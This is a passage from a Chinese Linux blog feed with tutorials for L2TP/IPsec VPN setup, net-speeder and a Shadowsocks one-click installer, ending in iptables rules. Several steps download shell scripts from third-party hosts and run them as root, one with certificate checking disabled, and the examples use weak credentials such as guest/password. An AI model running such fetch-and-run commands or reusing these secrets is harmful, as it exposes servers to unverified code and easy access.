Checking for 'ip' command                                       [OK]
Checking /bin/sh is not /bin/dash                               [WARNING]
Checking for 'iptables' command                                 [OK]
Opportunistic Encryption Support                                [DISABLED]
</pre>
你可能忘记修改网络策略：
<pre>for each in /proc/sys/net/ipv4/conf/*
do
    echo 0 &gt; $each/accept_redirects
    echo 0 &gt; $each/send_redirects
done
</pre>

<h3 id="错误3：Pluto-listening-for-IKE-on-udp-500-FAILED"><a href="#错误3：Pluto-listening-for-IKE-on-udp-500-FAILED" class="headerlink" title="错误3：Pluto listening for IKE on udp 500 [FAILED]"></a>错误3：Pluto listening for IKE on udp 500 [FAILED]</h3><pre>**Pluto listening for IKE on udp 500                              [FAILED]**
  Cannot execute command "lsof -i UDP:500": No such file or directory
**Pluto listening for NAT-T on udp 4500                           [FAILED]**
  Cannot execute command "lsof -i UDP:4500": No such file or directory
</pre>
那么你需要安装lsof：
<pre>apt-get install lsof
</pre>

<h2 id="五、测试与调试"><a href="#五、测试与调试" class="headerlink" title="五、测试与调试"></a>五、测试与调试</h2><h3 id="1-启用测试用户"><a href="#1-启用测试用户" class="headerlink" title="1.启用测试用户"></a>1.启用测试用户</h3><p>编辑/etc/ppp/chap-secrets文件，加入如下行：</p>
<p><pre># Secrets for authentication using CHAP</pre></p>
<h1 id="client-server-secret-IP-addresses"><a href="#client-server-secret-IP-addresses" class="headerlink" title="client        server  secret                  IP addresses"></a>client        server  secret                  IP addresses</h1><p>guest           l2tpd   password                <em><br><br>该行创建一个用户，用户名为guest，密码为password（明文）<br>server字段与options.xl2tpd配置文件中的name属性对应。还可以星号（</em>）代替，表示不限调用服务。<br>IP address表示来源IP，这里星号（*）表示接受所有连接。<br>对来源IP的过滤应该由iptables防火墙来完成。读者可以查阅本博客关于iptables的相关文章进行设置。</p>
<h3 id="2-连接"><a href="#2-连接" class="headerlink" title="2.连接"></a>2.连接</h3><p>现在就可以尝试连接，如果连接失败，需要通过查看日志信息排错。</p>
<h3 id="3-查看日志"><a href="#3-查看日志" class="headerlink" title="3.查看日志"></a>3.查看日志</h3><p>ipsec日志记录在/var/log/auth中，如果发现该行：</p>
<p><pre>STATE_MAIN_R3: sent MR3, ISAKMP SA established<br></pre><br>则表示IPSec认证或连接没有问题，可以检查其他日志。但是有时候即使出现established，也会在稍后的行中出现错误信息，这是需要用户留意的地方。<br>xl2tpd和pppd的日志记录在/var/log/syslog中。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><p>[1] <a href="http://www.ipsec-howto.org/" target="_blank" rel="external">The official IPsec Howto for Linux</a><br>[2] <a href="http://blog.riobard.com/2010/04/30/l2tp-over-ipsec-ubuntu" target="_blank" rel="external">Configure L2TP/IPSec VPN on Ubuntu</a><br>[3] <a href="http://bailey.st/blog/2011/07/06/secure-ipsecl2tp-vpn-for-on-the-road-android-devices/" target="_blank" rel="external">Secure IPsec/L2TP VPN for on the road android devices</a><br>[4] <a href="http://rootmanager.com/ubuntu-ipsec-l2tp-windows-domain-auth/setting-up-openswan-xl2tpd-with-native-windows-clients-lucid.html" target="_blank" rel="external">Setting Up an IPSec L2TP VPN server on Ubuntu for Windows clients</a><br>[5] <a href="http://www.linuxjournal.com/article/9916" target="_blank" rel="external">Creating VPNs with IPsec and SSL/TLS</a><br>[6] <a href="http://www.cnblogs.com/klobohyz/archive/2012/02/04/2337775.html" target="_blank" rel="external">ipsec安装好后运行ipsec verify命令发现错误的解决方案</a><br>[7] <a href="http://dipplum.com/2010/08/30/ubuntu-install-l2tp-server/" target="_blank" rel="external">在Ubuntu上安装L2TP/IPsec VPN服务器</a><br>[8] <a href="http://www.cnblogs.com/jjkv3/archive/2008/04/10/1147490.html" target="_blank" rel="external">VPN相关端口和协议</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Debian/Ubuntu 安装 net-speeder]]></title>
      <url>http://www.linux52.com/2015-09-30-debianubuntu-e5-ae-89-e8-a3-85-net-speeder.html</url>
      <content type="html"><![CDATA[<p><strong><span style="color: #ff0000;">centos</span></strong></p>
<p>net-speeder安装</p>
<p>wget <a href="https://coding.net/u/njzhenghao/p/download/git/raw/master/net_speeder-installer.sh" target="_blank" rel="external">https://coding.net/u/njzhenghao/p/download/git/raw/master/net_speeder-installer.sh</a><br>bash net_speeder-installer.sh<br>端口加速<br>这里对所有端口进行加速</p>
<p>nohup /usr/local/net_speeder/net_speeder venet0 “ip” &gt;/dev/null 2&gt;&amp;1 &amp;</p>
<p>加入开机启动</p>
<p>echo ‘nohup /usr/local/net_speeder/net_speeder venet0 “ip” &gt;/dev/null 2&gt;&amp;1 &amp;’ &gt;&gt; /etc/rc.local</p>
<p><strong><span style="color: #ff0000;">Debian/Ubuntu</span></strong></p>
<p>提供的一键安装脚本，直接运行如下命令即可：</p>
<pre><code>wget --no-check-certificate https://raw.githubusercontent.com/tennfy/debian_netspeeder_tennfy/master/debian_netspeeder_tennfy.sh;chmod a+x debian_netspeeder_tennfy.sh;bash debian_netspeeder_tennfy.sh  
`&lt;/pre&gt;
------- 以下为原文 -------

根据官方介绍：
&gt; [net-speeder](https://github.com/snooda/net-speeder) 可以在高延迟不稳定链路上优化单线程下载速度
其作用就是把包发两遍以减少丢包率，换言之，在中国电信等越来越恶劣的上网环境下，如果你用 VPS 科学上网，这个东东能提高你的上网速度（消耗双倍流量）。经过我在[DigitalOcean](https://www.digitalocean.com/?refcode=e2f4c88d8d08)（SFO 节点 Debian 7 32位系统）上的测试，ping 值由 300ms+ 下降到 180ms左右，下载速度也有不少提升，优化效果还是很明显的

对于新手来说，官方的说明可能看不太懂，这里列出一些命令，复制粘贴进去就能用了

## 1\. 安装运行及编译的依赖库

&lt;pre&gt;`apt-get install libnet1;apt-get install libpcap0.8;apt-get install libnet1-dev;apt-get install libpcap0.8-dev  
`&lt;/pre&gt;

## 2\. 下载源码到 VPS

&lt;pre&gt;`cd /var;wget https://github.com/snooda/net-speeder/raw/master/net_speeder.c;wget https://github.com/snooda/net-speeder/raw/master/build.sh  
`&lt;/pre&gt;

## 3\. 编译

&lt;pre&gt;`chmod +x build.sh;./build.sh -DCOOKED  
`&lt;/pre&gt;

## 4\. 查询 VPS 网卡名

&lt;pre&gt;`ifconfig  
`&lt;/pre&gt;
一般 Xen 架构为 `eth0` 或 OpenVZ 架构为 `venet0`

## 5\. 运行并加入开机启动

根据上一步获取的网卡名运行命令

`eth0` 运行
&lt;pre&gt;`nohup /var/net_speeder eth0 &quot;ip&quot;;echo &quot;nohup /var/net_speeder eth0 &quot;ip&quot; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot; &amp;gt;&amp;gt; /etc/rc.local  
`&lt;/pre&gt;
`venet0` 运行
&lt;pre&gt;`nohup /var/net_speeder venet0 &quot;ip&quot;;echo &quot;nohup /var/net_speeder venet0 &quot;ip&quot; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot; &amp;gt;&amp;gt; /etc/rc.local  
</code></pre>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Shadowsocks一键安装脚本（CentOS6,7、Ubuntu、Debian）]]></title>
      <url>http://www.linux52.com/2015-09-29-shadowsocks-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e8-84-9a-e6-9c-ac-ef-bc-88centos67-e3-80-81ubuntu-e3-80-81debian-ef-bc-89.html</url>
      <content type="html"><![CDATA[<p>简单理解的话，Shadowsocks是将以前通过SSH创建的Socks5协议拆开成Server端和client端，下面这个原理图能简单介绍其翻墙原理，基本上和利用SSH tunnel大致类似：</p>
<div align="center"><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/what-is-shadowsocks.png" alt=""></div>

<ol>
<li>PC客户端（即你的电脑）发出请求基于Socks5协议跟SS-Local端进行通讯，由于这个SS-Local一般是本机或路由器等局域网的其他机器，不经过GFW，所以解决GFW通过特征分析进行干扰的问题。</li>
<li>SS-Local和SS-Server两端通过多种可选的加密方法进行通讯，经过GFW的时候因为是常规的TCP包，没有明显特征码GFW也无法对通讯数据进行解密，因此通讯放行。</li>
<li>SS-Server将收到的加密数据进行解密，还原初始请求，再发送到用户需要访问的服务网站，获取响应原路再返回SS-04，返回途中依然使用了加密，使得流量是普通TCP包，并成功穿过GFW防火墙。<br>因此，Shadowsocks的优点在于它解决了GFW通过分析流量特征从而干扰的问题，这是它优于SSH和VPN翻墙的地方。</li>
</ol>
<h3 id="安装使用说明"><a href="#安装使用说明" class="headerlink" title="安装使用说明"></a>安装使用说明</h3><p>Shadowsocks服务端有<span class="wp_keywordlink"><a href="https://blog.linuxeye.com/category/Python" title="Python" target="_blank" rel="external">Python</a></span>、libev、go版本，从系统占用资源和多用户配置方面来考虑，我选择使用Python来作为Shadowsocks的服务端，网上已经有很多比较好的一键安装脚本，如teddysun，但对多用户配置还需要手工更改配置文件（iptables、/etc<br>/shadowsocks.json）。于是，自己写一个，包含安装、添加用户和卸载功能，并整合到《<a href="http://oneinstack.com/" target="_blank" rel="external">OneinStack</a>》和《<a href="https://blog.linuxeye.com/31.html" target="_blank" rel="external">lnmp一键安装包</a>》中。</p>
<p>7月8号之前一键安装包，怎么使用该脚本？</p>
<pre class="prettyprint linenums">cd lnmp #如果使用oneinstack（cd oneinstack)
wget http://mirrors.linuxeye.com/lnmp/shadowsocks.sh
chmod +x shadowsocks.sh
./shadowsocks.sh install #安装、添加用户、卸载和后面一样
</pre>

<h4 id="Shadowsocks安装"><a href="#Shadowsocks安装" class="headerlink" title="Shadowsocks安装"></a>Shadowsocks安装</h4><pre class="prettyprint linenums">wget http://mirrors.linuxeye.com/oneinstack.tar.gz
tar xzf oneinstack.tar.gz
cd oneinstack
./shadowsocks.sh install
</pre>
<div align="center">![](https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks_install.jpg)</div>
出现如下即安装成功：
<pre class="prettyprint linenums">Your Server IP: You_Server_IP
Your Server Port: 9001
Your Password: oneinstack
Your Local IP: 127.0.0.1
Your Local Port: 1080
Your Encryption Method: aes-256-cfb
</pre>

<h4 id="Shadowsocks添加用户"><a href="#Shadowsocks添加用户" class="headerlink" title="Shadowsocks添加用户"></a>Shadowsocks添加用户</h4><pre class="prettyprint linenums">./shadowsocks.sh adduser</pre>
<div align="center">![](https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks_adduser.jpg)</div>

#### Shadowsocks卸载

<pre class="prettyprint lang-bsh">./shadowsocks.sh uninstall</pre>
<div align="center">![](https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks_uninstall.jpg)</div>

#### Shadowsocks服务管理

<pre class="prettyprint lang-bsh">
service shadowsocks start   #启动
service shadowsocks stop      #关闭
service shadowsocks restart  #重启
service shadowsocks status   #状态</pre>

<h3 id="本地客户端"><a href="#本地客户端" class="headerlink" title="本地客户端"></a>本地客户端</h3><p>Windows 和 OS X 下的 GUI 客户端可以下载shadowsocks-gui，下载地址</p>
<p><a href="http://sourceforge.net/projects/shadowsocksgui/files/dist" target="_blank" rel="external">http://sourceforge.net/projects/shadowsocksgui/files/dist</a></p>
<p>目前最新版本为<a href="http://sourceforge.net/projects/shadowsocksgui/files/dist/Shadowsocks-win-2.3.1.zip/download" target="_blank" rel="external">Shadowsocks-win-2.3.1.zip</a>和<a href="http://sourceforge.net/projects/shadowsocksgui/files/dist/ShadowsocksX-2.6.3.dmg/download" target="_blank" rel="external">ShadowsocksX-2.6.3.dmg</a></p>
<p>如果无法打开，请使用备份地址</p>
<p><strong>Win：</strong></p>
<p>.NET Framework 3.5 版本，适合 Windows 7 用户，链接：<a href="http://pan.baidu.com/s/1kTKjIxp" target="_blank" rel="external">http://pan.baidu.com/s/1kTKjIxp</a> 密码：j3xd</p>
<p>.NET Framework 4.0 版本，适合 Windows 8.1 用户，链接：<a href="http://pan.baidu.com/s/1jUnFK" target="_blank" rel="external">http://pan.baidu.com/s/1jUnFK</a> 密码：8220</p>
<p><strong>OS X：</strong></p>
<p>链接：<a href="http://pan.baidu.com/s/1mglBIBY" target="_blank" rel="external">http://pan.baidu.com/s/1mglBIBY</a> 密码：2cqe</p>
<p>针对两个系统，OS X 和 Windows，以及手机 iOS 和 Android 客户端。</p>
<h4 id="OS-X-下设置使用方法"><a href="#OS-X-下设置使用方法" class="headerlink" title="OS X 下设置使用方法"></a>OS X 下设置使用方法</h4><p>Mac 下使用极其方便，因为 GUI 已经集成了系统 Pac，所以无需设置任何科学上网的姿势，直接运行ShadowsocksX，然后输入服务商提供给你的账号信息，保存运行后，即可在所有浏览器里直接科学上网，如图：</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks-GUI-Mac-Menu.png" alt=""></p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks-GUI-Mac-Screenshot.png" alt=""></p>
<h4 id="Windows-下设置使用方法"><a href="#Windows-下设置使用方法" class="headerlink" title="Windows 下设置使用方法"></a>Windows 下设置使用方法</h4><p>解压Shadowsocks-win-2.3.1.zip，打开shadowsocks.exe</p>
<p>然后输入服务商提供给你的账号信息，如图：</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks-win-Menu.png" alt=""></p>
<p>点击OK保存，成功后会在桌面右下方显示 Shadowsocks logo 的图标，然后右键点击 Enable 运行</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks-win-Screenshot.png" alt=""></p>
<p>由于 Windows 系统的复杂性，我们需要单独对浏览器进行设置，本文只介绍 Chrome 和 Firefox 这两款优秀的浏览器，至于其他的浏览器，如 IE 等，本文不会介绍。</p>
<p><strong>① Chrome 下的 Proxy SwitchySharp 插件</strong></p>
<p><a href="https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm?hl=zh-CN" target="_blank" rel="external">https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm?hl=zh-CN</a></p>
<p>如果您无法访问，也可以下载这个 .crx 文件</p>
<p>链接：<a href="http://pan.baidu.com/s/1jGmvMPg" target="_blank" rel="external">http://pan.baidu.com/s/1jGmvMPg</a> 密码：if2e</p>
<p>下载完成后在设置&gt;&gt;扩展，直接把该 .crx 文件拖入窗口然后安装即可</p>
<p>然后打开 Proxy SwitchySharp 的设置，新建一个情景，命名为 Shadowsocks，并设置好端口，模式为 socks5 如图：</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/SwitchySharps-Option.jpg" alt=""></p>
<p>再点切换规则，由于可能大概无法访问 Google，我们就启用切换规则，然后在 URL 模式里输入 <em>google</em> 统配好 Google 的所有域名，选择好模式匹配为通配符，情景模式为 Shadowsocks</p>
<p>然后把在线规则列表打钩，输入URL为：<a href="https://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txt" target="_blank" rel="external">https://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txt</a></p>
<p>勾选AutoProxy 兼容列表，然后点立即更新，更新完成后保存即可，如图：</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/SwitchySharps-Choose-Rules.jpg" alt=""></p>
<p>如果不想用插件，直接全局代理，就把桌面的快捷方式 chrome.exe 右键 属性 &gt;&gt; 修改 Chrome.exe 运行参数，在目标那一栏，最后的引号后面加上</p>
<p><pre class="prettyprint lang-bsh"><span class="pun">–</span><span class="pln">proxy</span><span class="pun">-</span><span class="pln">server</span><span class="pun">=</span><span class="str">“socks5://127.0.0.1:1080”</span> <span class="pun">–</span><span class="pln">host</span><span class="pun">-</span><span class="pln">resolver</span><span class="pun">-</span><span class="pln">rules</span><span class="pun">=</span><span class="str">“MAP * 0.0.0.0 , EXCLUDE localhost”</span></pre><br>就是说修改为类似（1080 为你设置的本地端口，如果设置了不同的端口请自行修改）</p>
<p><pre class="prettyprint lang-bsh"><span class="str">“C:\Program Files (x86)\Google\Chrome\Application\chrome.exe”</span><span class="pun">–</span><span class="pln">proxy</span><span class="pun">-</span><span class="pln">server</span><span class="pun">=</span><span class="str">“socks5://127.0.0.1:1080”</span> <span class="pun">–</span><span class="pln">host</span><span class="pun">-</span><span class="pln">resolver</span><span class="pun">-</span><span class="pln">rules</span><span class="pun">=</span><span class="str">“MAP * 0.0.0.0 , EXCLUDE localhost”</span></pre><br>然后运行 Chrome 即可</p>
<p><strong>② Firefox 下的 AutoProxy 20131215 修复版</strong></p>
<p>由于 AutoProxy 的作者没有更新，新的版本无法在 Firefox 27.0 以后进行代理规则设置，所以我们用 xthunder 作者 的修复版，下载链接：<a href="http://xthunder.googlecode.com/files/autoproxy20131215.xpi" target="_blank" rel="external">http://xthunder.googlecode.com/files/autoproxy20131215.xpi</a></p>
<p>如果您无法访问，也可以访问此链接：<a href="http://pan.baidu.com/s/1c0rrGDq" target="_blank" rel="external">http://pan.baidu.com/s/1c0rrGDq</a> 密码：9abj</p>
<p>下载好这个 .xpi 文件后，直接拖入任何 Firefox 窗口，然后安装重启浏览器即可。之后点击右上方新出现的小地球图标，进行设置</p>
<p>点击首选项</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/AutoProxy-Menu.jpg" alt=""></p>
<p>依次点击代理服务器&gt;&gt;编辑代理服务器</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/AutoProxy-Choose-Proxy-Server.jpg" alt=""></p>
<p>新增加一个名称为Shadowsocks设置好本地的端口，类型为socks5</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/AutoProxy-Edit-Proxy-Server.jpg" alt=""></p>
<p>然后点击代理规则&gt;&gt;增加代理规则</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/AutoProxy-Add-List.jpg" alt=""></p>
<p>订阅 GFW List</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/AutoProxy-Add-List-2.jpg" alt=""></p>
<p>然后保存，可以设置全局代理，也可以设置自动代理，推荐使用自动代理，只针对某一批网站走代理，然后右上方的小地球图标会变成蓝色（自动模式）或绿色（全局模式）</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/AutoProxy-Works.jpg" alt=""> <img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/AutoProxy-Works-2.jpg" alt=""></p>
<h4 id="Android-以及-iOS-客户端"><a href="#Android-以及-iOS-客户端" class="headerlink" title="Android 以及 iOS 客户端"></a>Android 以及 iOS 客户端</h4><p>如果需要局部科学上网，那么你的 Android 需要 root，如果木有 root，那么就只能全局上网</p>
<p>Android 客户端下载地址请摸我：</p>
<p><a href="https://play.google.com/store/apps/details?id=com.github.shadowsocks" target="_blank" rel="external">https://play.google.com/store/apps/details?id=com.github.shadowsocks</a></p>
<p>如果您无法访问，也可以摸摸这个：</p>
<p><a href="http://apps.evozi.com/apk-downloader/?id=com.github.shadowsocks" target="_blank" rel="external">http://apps.evozi.com/apk-downloader/?id=com.github.shadowsocks</a></p>
<p>设置账号信息和电脑上基本一致：</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks-Android.jpg" alt=""></p>
<p>iOS 非越狱的话，可以直接安装 Shadowsocks 的 app，下载地址请访问：</p>
<p><a href="https://itunes.apple.com/us/app/shadowsocks/id665729974?ls=1&amp;mt=8" target="_blank" rel="external">https://itunes.apple.com/us/app/shadowsocks/id665729974?ls=1&amp;mt=8</a></p>
<p>这是个自带 SS 的浏览器，设置账号信息等大同小异，点击右上方的+号，然后设置你的账号：</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks-iOS.png" alt=""></p>
<p>iOS 越狱了的话，直接在 Cydia 里搜索 Shadowsocks ，然后安装</p>
<p><img src="https://blog.linuxeye.com/wp-content/uploads/2015/07/Shadowsocks-iOS-Jail.jpg" alt=""></p>
<p>客户端信息参考：<a href="http://ttt.tt/150/" target="_blank" rel="external">http://ttt.tt/150/</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Centos 7 安装 l2tp/ipsec vpn]]></title>
      <url>http://www.linux52.com/2015-09-29-centos-7-e5-ae-89-e8-a3-85-l2tpipsec-vpn.html</url>
      <content type="html"><![CDATA[<h2 id="1-安装-l2tp-ipsec-所需要的软件包"><a href="#1-安装-l2tp-ipsec-所需要的软件包" class="headerlink" title="1.安装 l2tp ipsec 所需要的软件包"></a>1.安装 l2tp ipsec 所需要的软件包</h2><blockquote>
<p>yum install epel-release</p>
<p>yum install openswan xl2tpd ppp lsof</p>
</blockquote>
<h2 id="2-设置ipsec"><a href="#2-设置ipsec" class="headerlink" title="2.设置ipsec"></a>2.设置ipsec</h2><blockquote>
<h3 id="2-1-编辑-etc-ipsec-conf"><a href="#2-1-编辑-etc-ipsec-conf" class="headerlink" title="2.1 编辑 /etc/ipsec.conf"></a>2.1 编辑 /etc/ipsec.conf</h3><blockquote>
<p>vi /etc/ipsec.conf</p>
<p>把下面xx.xxx.xxx.xxx换成你自己主机实际的外网固定IP。其他的不动。</p>
<p>&nbsp;</p>
<p>config setup</p>
<p>protostack=netkey</p>
<p>dumpdir=/var/run/pluto/</p>
<p>nat_traversal=yes</p>
<p>virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v4:100.64.0.0/10,%v6:fd00::/8,%v6:fe80::/10</p>
<p>conn L2TP-PSK-NAT</p>
<p>rightsubnet=vhost:%priv</p>
<p>also=L2TP-PSK-noNAT</p>
<p>conn L2TP-PSK-noNAT</p>
<p>authby=secret</p>
<p>pfs=no</p>
<p>auto=add</p>
<p>keyingtries=3</p>
<p>dpddelay=30</p>
<p>dpdtimeout=120</p>
<p>dpdaction=clear</p>
<p>rekey=no</p>
<p>ikelifetime=8h</p>
<p>keylife=1h</p>
<p>type=transport</p>
<p>left=xxx.xxx.xxx.xxx</p>
<p>leftprotoport=17/1701</p>
<p>right=%any</p>
<p>rightprotoport=17/%any</p>
</blockquote>
<h3 id="2-2-编辑-etc-ipsec-secrets"><a href="#2-2-编辑-etc-ipsec-secrets" class="headerlink" title="2.2 编辑/etc/ipsec.secrets"></a>2.2 编辑/etc/ipsec.secrets</h3><blockquote>
<p>vi /etc/ipsec.secrets</p>
<p>include /etc/ipsec.d/*.secrets</p>
<p>/etc/ipsec.secrets 文件里面默认有一句包含 /etc/ipsec.d/<em>.secrets 的语句.所以可以直接在 /etc/ipsec.d 目录下新建一自己的个 </em>.secrets 文件.也可以直接把它注释掉,添加下面的配置语句.</p>
<p>vi /etc/ipsec.d/my.secrets</p>
<p>&nbsp;</p>
<pre>xxx.xxx.xxx.xxx %any: PSK "kuaile"</pre>

<p>&nbsp;</p>
<p>xx.xxx.xxx.xxx换成你自己VPS实际的外网固定IP, YourPsk你自己定一个，到时候连VPN的时候用，比如可以填csdn.net, 注意空格。</p>
</blockquote>
<h3 id="2-3-修改-添加-etc-sysctl-conf"><a href="#2-3-修改-添加-etc-sysctl-conf" class="headerlink" title="2.3 修改/添加 /etc/sysctl.conf"></a>2.3 修改/添加 /etc/sysctl.conf</h3><blockquote>
<p>vi /etc/sysctl.conf</p>
<p>确保下面的字段都有，对应的值或下面一样。省事的话直接在/etc/sysctl.conf的末尾直接把下面内容的粘过去。</p>
<p>&nbsp;</p>
<pre>net.ipv4.ip_forward = 1</pre>

<pre>net.ipv4.conf.default.accept_redirects = 0</pre>

<pre>net.ipv4.conf.default.send_redirects = 0

net.ipv4.conf.eth0.rp_filter = 0</pre>

<pre>net.ipv4.conf.default.rp_filter = 0</pre>


</blockquote>
<h3 id="2-4-让修改后的sysctl-conf生效"><a href="#2-4-让修改后的sysctl-conf生效" class="headerlink" title="2.4 让修改后的sysctl.conf生效"></a>2.4 让修改后的sysctl.conf生效</h3><h3 id="sysctl-p"><a href="#sysctl-p" class="headerlink" title="sysctl -p"></a>sysctl -p</h3><h3 id="2-5-验证ipsec运行状态"><a href="#2-5-验证ipsec运行状态" class="headerlink" title="2.5 验证ipsec运行状态"></a>2.5 验证ipsec运行状态</h3><blockquote>
<p>ipsec setup start</p>
<p>ipsec verify</p>
<p>verify的内容如下所示，那么就离成功不远了。没有 红色 的fail 就可以了.</p>
<p>&nbsp;</p>
<p>[root@Centos7 ~]# ipsec verify</p>
<p>Verifying installed system and configuration files</p>
<p>Version check and ipsec on-path                       [OK]</p>
<p>Libreswan 3.8 (netkey) on 3.10.0-123.9.3.el7.x86_64</p>
<p>Checking for IPsec support in kernel                  [OK]</p>
<p>NETKEY: Testing XFRM related proc values</p>
<p>ICMP default/send_redirects                  [OK]</p>
<p>ICMP default/accept_redirects                [OK]</p>
<p>XFRM larval drop                             [OK]</p>
<p>Pluto ipsec.conf syntax                               [OK]</p>
<p>Hardware random device                                [N/A]</p>
<p>Checking rp_filter                                    [OK]</p>
<p>Checking that pluto is running                        [OK]</p>
<p>Pluto listening for IKE on udp 500                   [OK]</p>
<p>Pluto listening for IKE/NAT-T on udp 4500            [OK]</p>
<p>Pluto ipsec.secret syntax                            [OK]</p>
<p>Checking NAT and MASQUERADEing                        [TEST INCOMPLETE]</p>
<p>Checking ‘ip’ command                                 [OK]</p>
<p>Checking ‘iptables’ command                           [OK]</p>
<p>Checking ‘prelink’ command does not interfere with FIPSChecking for obsolete ipsec.conf options              [OK]</p>
<p>Opportunistic Encryption                              [DISABLED]</p>
<p>[root@Centos7 ~]#</p>
</blockquote>
</blockquote>
<h2 id="3-设置-l2tp"><a href="#3-设置-l2tp" class="headerlink" title="3. 设置 l2tp"></a>3. 设置 l2tp</h2><blockquote>
<h3 id="3-1-编辑-etc-xl2tpd-xl2tpd-conf"><a href="#3-1-编辑-etc-xl2tpd-xl2tpd-conf" class="headerlink" title="3.1 编辑 /etc/xl2tpd/xl2tpd.conf"></a>3.1 编辑 /etc/xl2tpd/xl2tpd.conf</h3><blockquote>
<p>vim /etc/xl2tpd/xl2tpd.conf</p>
<p>&nbsp;</p>
<p>[global]</p>
<p>ipsec saref = yes</p>
<p>listen-addr = xxx.xxx.xxx.xxx         ;这里是你的主机外网ip地址,;号是注释,和一般的配置文件不同</p>
<p>; Use refinfo of 22 if using an SAref kernel patch based on openswan 2.6.35 or</p>
<p>;  when using any of the SAref kernel patches for kernels up to 2.6.35.</p>
<p>; saref refinfo = 30</p>
<p>;</p>
<p>force userspace = yes</p>
<p>;</p>
<p>; debug tunnel = yes</p>
<p>[lns default]</p>
<p>ip range = 10.0.10.2-10.0.10.100      ;这里是VPN client的内网ip地址范围</p>
<p>local ip = 10.0.10.1                  ;这里是VPN server的内网地址</p>
<p>refuse chap = yes</p>
<p>refuse pap = yes</p>
<p>require authentication = yes</p>
<p>name = LinuxVPNserver</p>
<p>ppp debug = yes</p>
<p>pppoptfile = /etc/ppp/options.xl2tpd</p>
<p>length bit = yes</p>
<p>###</p>
</blockquote>
<h3 id="3-2-编辑-etc-ppp-options-xl2tpd"><a href="#3-2-编辑-etc-ppp-options-xl2tpd" class="headerlink" title="3.2 编辑 /etc/ppp/options.xl2tpd"></a>3.2 编辑 /etc/ppp/options.xl2tpd</h3><blockquote>
<p>vi /etc/ppp/options.xl2tpd</p>
<p>&nbsp;</p>
<p>name l2tpd</p>
<p>require-mschap-v2</p>
<p>ms-dns 8.8.8.8</p>
<p>ms-dns 8.8.4.4</p>
<p>ipcp-accept-local</p>
<p>ipcp-accept-remote</p>
<p>#ms-dns  8.8.8.8</p>
<p>noccp</p>
<p>auth</p>
<p>crtscts</p>
<p>idle 1800</p>
<p>mtu 1410</p>
<p>mru 1410</p>
<p>nodefaultroute</p>
<p>debug</p>
<p>lock</p>
<p>proxyarp</p>
<p>connect-delay 5000</p>
<p>&nbsp;</p>
<h3 id="3-3-配置用户名-密码-编辑-etc-ppp-chap-secrets"><a href="#3-3-配置用户名-密码-编辑-etc-ppp-chap-secrets" class="headerlink" title="3.3 配置用户名,密码:编辑 /etc/ppp/chap-secrets"></a>3.3 配置用户名,密码:编辑 /etc/ppp/chap-secrets</h3><p>vim /etc/ppp/chap-secrets</p>
<p>client和secret自己填，server和IP留<em>号，l2tp 可以用上面自己设定的 l2tpd .</em> 通用</p>
<h1 id="Secrets-for-authentication-using-CHAP"><a href="#Secrets-for-authentication-using-CHAP" class="headerlink" title="Secrets for authentication using CHAP"></a>Secrets for authentication using CHAP</h1><h1 id="client-server-secret-IP-addresses"><a href="#client-server-secret-IP-addresses" class="headerlink" title="client        server  secret                  IP addresses"></a>client        server  secret                  IP addresses</h1><p>username <em> userpass </em></p>
</blockquote>
<h3 id="3-4-启动xl2tp"><a href="#3-4-启动xl2tp" class="headerlink" title="3.4 启动xl2tp"></a>3.4 启动xl2tp</h3><blockquote>
<p><pre>service xl2tpd start</pre><br>&nbsp;</p>
</blockquote>
</blockquote>
<h2 id="4-开放端口以及转发"><a href="#4-开放端口以及转发" class="headerlink" title="4. 开放端口以及转发"></a>4. 开放端口以及转发</h2><blockquote>
<p>原样执行下面所有命令</p>
<p>&nbsp;</p>
<p>/sbin/iptables -A INPUT -p udp -m policy –dir in –pol ipsec -m udp –dport 1701 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p udp -m udp –dport 1701 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p udp -m udp –dport 500 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p udp -m udp –dport 4500 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p esp -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -m policy –dir in –pol ipsec -j ACCEPT</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>/sbin/iptables -A FORWARD -d 10.0.10.0/24 -j ACCEPT</p>
<p>/sbin/iptables -A FORWARD -s 10.0.10.0/24 -j ACCEPT</p>
